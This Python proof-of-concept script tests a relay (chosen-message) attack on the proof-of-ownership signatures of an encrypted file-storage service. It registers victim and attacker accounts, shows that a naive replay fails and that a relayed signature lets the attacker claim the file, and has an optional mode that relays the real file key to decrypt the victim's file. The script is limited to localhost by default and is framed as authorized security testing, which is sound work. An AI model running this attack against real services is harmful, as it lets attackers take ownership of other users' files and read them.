#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse

from client_cli.api.http_client import APIClient, APIError
from client_cli.crypto.file_encrypt import decrypt_ciphertext, encrypt_file
from client_cli.crypto.file_hash import sha256_file_hex
from client_cli.crypto.file_keys import derive_encryption_key, derive_file_key, derive_pow_seed
from client_cli.crypto.key_wrap import unwrap_file_key, wrap_file_key
from client_cli.crypto.oprf_client import build_oprf_client
from client_cli.crypto.password_kdf import b64e, derive_kek, generate_salt
from client_cli.crypto.pow_sign import build_claim_message, derive_pow_material, sign_message_b64
from client_cli.crypto.private_metadata import encrypt_display_name
from client_cli.crypto.root_key import encrypt_root_key, generate_root_key, unlock_root_key_from_bootstrap
from client_cli.models.manifest import Manifest


@dataclass
class Account:
    email: str
    password: str
    user_id: str
    token: str
    root_key: bytes


def _require_local_url(base_url: str, allow_non_local: bool) -> None:
    host = (urlparse(base_url).hostname or "").lower()
    local_hosts = {"localhost", "127.0.0.1", "::1"}
    if host not in local_hosts and not allow_non_local:
        raise SystemExit(
            f"Refusing to run against non-local API host {host!r}. "
            "Use --allow-non-local only for systems you own and are authorized to test."
        )


def _register_and_login(api_base_url: str, email: str, password: str) -> Account:
    root_key = generate_root_key()
    salt = generate_salt()
    kek = derive_kek(password, salt)
    enc = encrypt_root_key(root_key, kek)

    with APIClient(api_base_url) as api:
        api.register(
            email=email,
            password=password,
            enc_urk_b64=enc.ciphertext_b64,
            enc_urk_nonce_b64=enc.nonce_b64,
            kek_salt_b64=b64e(salt),
        )
        login = api.login(email=email, password=password)
        token = str(login["access_token"])
        user_id = str(login["user_id"])
        api.set_token(token)
        bootstrap = api.get_bootstrap()
        unlocked = unlock_root_key_from_bootstrap(password, bootstrap)
        if unlocked != root_key:
            raise RuntimeError("bootstrap sanity check failed")

    return Account(email=email, password=password, user_id=user_id, token=token, root_key=root_key)


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Authorized local PoC for relay/chosen-message Proof-of-Ownership signature testing."
    )
    parser.add_argument("--api-base-url", default="http://localhost:8000")
    parser.add_argument("--file", default="relay-secret-demo.txt", help="Local plaintext file to upload as victim")
    parser.add_argument("--suffix", default=str(int(time.time())), help="Unique suffix for demo accounts")
    parser.add_argument("--password", default="RelayDemo123")
    parser.add_argument("--allow-non-local", action="store_true")
    parser.add_argument(
        "--full-bundle",
        action="store_true",
        help="Also demo stronger compromised-client case where the real file key is relayed. Not a pure signature relay.",
    )
    args = parser.parse_args()

    _require_local_url(args.api_base_url, args.allow_non_local)

    path = Path(args.file)
    if not path.exists():
        path.write_bytes(b"secret cloud document for relay signature lab\n")

    print("[1] Register victim and attacker accounts")
    victim = _register_and_login(args.api_base_url, f"victim-relay-{args.suffix}@example.com", args.password)
    attacker = _register_and_login(args.api_base_url, f"attacker-relay-{args.suffix}@example.com", args.password)

    print("[2] Victim prepares file crypto material and uploads ciphertext")
    file_hash_hex, file_size = sha256_file_hex(path)
    oprf_output = build_oprf_client(args.api_base_url).evaluate(file_hash_hex=file_hash_hex)
    file_key = derive_file_key(oprf_output)
    encryption_key = derive_encryption_key(file_key)
    signing_key, _pk_bytes, pk_pow_b64, tag_hex = derive_pow_material(derive_pow_seed(file_key))
    wrapped_victim = wrap_file_key(victim.root_key, file_key)
    enc_name_victim = encrypt_display_name(victim.root_key, "victim-private-name.txt")
    ciphertext, manifest = encrypt_file(
        path,
        encryption_key=encryption_key,
        file_hash_hex=file_hash_hex,
        tag_hex=tag_hex,
        pk_pow_b64=pk_pow_b64,
        original_filename=None,
    )

    with APIClient(args.api_base_url, token=victim.token) as api_victim:
        init = api_victim.init_upload(tag_hex=tag_hex, pk_pow_b64=pk_pow_b64, manifest=manifest.to_dict())
        api_victim.upload_presigned_bytes(
            upload_url=str(init["upload_url"]),
            payload=ciphertext,
            content_type=manifest.mime_type,
        )
        complete = api_victim.complete_upload(
            session_id=str(init["session_id"]),
            tag_hex=tag_hex,
            wrapped_kf_b64=wrapped_victim.ciphertext_b64,
            wk_nonce_b64=wrapped_victim.nonce_b64,
            manifest=manifest.to_dict(),
            enc_display_name_b64=enc_name_victim.ciphertext_b64,
            display_name_nonce_b64=enc_name_victim.nonce_b64,
        )
        file_id = str(complete["file_id"])

    print(f"    file_id={file_id}")
    print(f"    tag_hex={tag_hex}")
    print(f"    file_size={file_size}")

    print("[3] Naive replay: victim-bound signature submitted by attacker should fail")
    with APIClient(args.api_base_url, token=victim.token) as api_victim, APIClient(args.api_base_url, token=attacker.token) as api_attacker:
        victim_ch = api_victim.create_challenge(tag_hex=tag_hex)
        victim_msg = build_claim_message(
            context=str(victim_ch["context"]),
            user_id=victim.user_id,
            tag_hex=tag_hex,
            nonce_b64=str(victim_ch["nonce_b64"]),
        )
        victim_sig = sign_message_b64(signing_key, victim_msg)
        _ = api_attacker.create_challenge(tag_hex=tag_hex)
        fake_wrapped = wrap_file_key(attacker.root_key, os.urandom(32))
        fake_name = encrypt_display_name(attacker.root_key, "naive-replay.txt")
        try:
            api_attacker.claim_existing(
                tag_hex=tag_hex,
                wrapped_kf_b64=fake_wrapped.ciphertext_b64,
                wk_nonce_b64=fake_wrapped.nonce_b64,
                signature_b64=victim_sig,
                enc_display_name_b64=fake_name.ciphertext_b64,
                display_name_nonce_b64=fake_name.nonce_b64,
            )
        except APIError as exc:
            print(f"    OK: naive replay rejected: HTTP {exc.status_code}: {exc}")
        else:
            print("    WARNING: naive replay unexpectedly succeeded")

    print("[4] Chosen-message relay: victim signs attacker's exact challenge")
    attacker2 = _register_and_login(args.api_base_url, f"attacker-oracle-{args.suffix}@example.com", args.password)
    with APIClient(args.api_base_url, token=attacker2.token) as api_attacker:
        ch = api_attacker.create_challenge(tag_hex=tag_hex)
        attacker_msg = build_claim_message(
            context=str(ch["context"]),
            user_id=attacker2.user_id,
            tag_hex=tag_hex,
            nonce_b64=str(ch["nonce_b64"]),
        )
        relayed_sig = sign_message_b64(signing_key, attacker_msg)

        fake_file_key = os.urandom(32)
        fake_wrapped = wrap_file_key(attacker2.root_key, fake_file_key)
        fake_name = encrypt_display_name(attacker2.root_key, "relay-bogus-owner.txt")
        claim = api_attacker.claim_existing(
            tag_hex=tag_hex,
            wrapped_kf_b64=fake_wrapped.ciphertext_b64,
            wk_nonce_b64=fake_wrapped.nonce_b64,
            signature_b64=relayed_sig,
            enc_display_name_b64=fake_name.ciphertext_b64,
            display_name_nonce_b64=fake_name.nonce_b64,
        )
        print(f"    Claim accepted: {claim}")

        dl = api_attacker.init_download(file_id=file_id)
        recovered = unwrap_file_key(attacker2.root_key, str(dl["wrapped_kf_b64"]), str(dl["wk_nonce_b64"]))
        try:
            decrypt_ciphertext(
                ciphertext,
                encryption_key=derive_encryption_key(recovered),
                manifest=Manifest.from_dict(dl["manifest"]),
            )
        except Exception as exc:
            print(f"    OK: attacker is listed as owner, but decrypt fails without real K: {type(exc).__name__}")
        else:
            print("    WARNING: bogus-key relay decrypted unexpectedly")

    if args.full_bundle:
        print("[5] Stronger full-bundle relay: signature + real file_key K relayed")
        attacker3 = _register_and_login(args.api_base_url, f"attacker-full-{args.suffix}@example.com", args.password)
        with APIClient(args.api_base_url, token=attacker3.token) as api_attacker:
            ch = api_attacker.create_challenge(tag_hex=tag_hex)
            msg = build_claim_message(
                context=str(ch["context"]),
                user_id=attacker3.user_id,
                tag_hex=tag_hex,
                nonce_b64=str(ch["nonce_b64"]),
            )
            sig = sign_message_b64(signing_key, msg)
            good_wrapped = wrap_file_key(attacker3.root_key, file_key)
            enc_name = encrypt_display_name(attacker3.root_key, "relay-full-access.txt")
            api_attacker.claim_existing(
                tag_hex=tag_hex,
                wrapped_kf_b64=good_wrapped.ciphertext_b64,
                wk_nonce_b64=good_wrapped.nonce_b64,
                signature_b64=sig,
                enc_display_name_b64=enc_name.ciphertext_b64,
                display_name_nonce_b64=enc_name.nonce_b64,
            )
            dl = api_attacker.init_download(file_id=file_id)
            real_k = unwrap_file_key(attacker3.root_key, str(dl["wrapped_kf_b64"]), str(dl["wk_nonce_b64"]))
            try:
                downloaded = api_attacker.download_presigned_bytes(download_url=str(dl["download_url"]))
            except APIError as exc:
                print(f"    Could not fetch presigned object, fallback to in-memory ciphertext: {exc}")
                downloaded = ciphertext
            plain = decrypt_ciphertext(
                downloaded,
                encryption_key=derive_encryption_key(real_k),
                manifest=Manifest.from_dict(dl["manifest"]),
            )
            if plain == path.read_bytes():
                print("    CONFIRMED: full bundle relay decrypts successfully")
            else:
                print("    WARNING: full bundle relay plaintext mismatch")

    print("DONE")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
